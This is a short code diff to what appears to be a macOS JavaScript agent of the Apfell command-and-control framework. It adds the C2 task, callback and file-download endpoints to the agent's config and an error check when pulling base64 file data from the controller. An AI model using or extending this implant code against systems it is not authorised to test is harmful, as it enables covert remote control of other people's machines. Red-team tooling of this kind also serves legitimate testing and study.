@@ -68,7 +68,9 @@ class customC2 extends baseC2{
 	getConfig(){
 		//A RESTful base config consists of the following:
 		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
-		return JSON.stringify({'baseurl': this.baseurl, 'interval': this.interval, 'killdate': '', 'commands': this.commands.join(",")}, null, 2);
+		return JSON.stringify({'baseurl': this.baseurl, 'interval': this.interval, 'killdate': '', 'commands': this.commands.join(","),
+		"GETFILE":this.get_file_path, "GETNEXTTASK":this.get_next_task, "NEWCALLBACK":this.post_new_callback,
+		"POSTRESPONSE":this.post_response}, null, 2);
 	}
 	setConfig(params){
 		//A RESTful base config has 3 updatable components
@@ -224,6 +226,9 @@ class customC2 extends baseC2{
 	        var url = this.getGetFilePath(params);
 	        //var url = "api/v1.0/files/" + params;
             var file_data = this.htmlGetData(this.baseurl + url);
+            if(file_data === undefined){
+                throw "Got nothing from the Apfell server";
+            }
             var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
             //var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
             return decoded_data;
